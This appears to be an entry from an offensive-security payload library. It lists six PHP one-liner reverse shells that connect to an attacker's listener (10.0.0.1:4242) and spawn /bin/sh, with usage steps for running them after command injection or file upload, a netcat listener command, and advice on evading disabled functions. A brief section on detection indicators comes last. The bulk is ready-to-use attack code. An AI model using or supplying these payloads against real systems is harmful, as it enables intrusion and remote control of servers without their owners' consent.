---
id: db255b81-fb7e-4d1a-8a53-3587c29259e9
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:24.289242+00:00'
updated_at: '2023-04-10T20:25:26.707920+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - php
  - payload
validated: true
---

# PHP-Fsockopen-Reverse-Shell-Variations

## Code

```bash
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

## Description

This code provides multiple one-liner variations for establishing a reverse shell using PHP's fsockopen to create a TCP socket, combined with various execution functions (exec, shell_exec, backticks, system, passthru, popen) to spawn a shell and redirect I/O. Each line is a standalone invocation executable via PHP CLI on the target, ideal for quick post-exploitation after RCE or file upload.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listener | 10.0.0.1 |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., via netcat) | 4242 |

## Usage

Substitute the IP and port placeholders with actual values. On the target system with PHP access, run one variation (e.g., via command injection or uploaded script). First, start a listener on the attacker machine: `nc -lvnp 4242`. Select a variation based on PHP configuration restrictions (e.g., if exec is disabled, try system). Used in procedures like [[procedures/Establish-PHP-Reverse-Shell]] for gaining shell access.

## Detection

- Outbound TCP connections from web/PHP processes to unusual IPs/ports.
- PHP error logs showing fsockopen or execution function usage.
- Process monitoring revealing PHP spawning /bin/sh or unusual child processes.
- Network IDS signatures for reverse shell patterns (e.g., shell I/O over TCP).
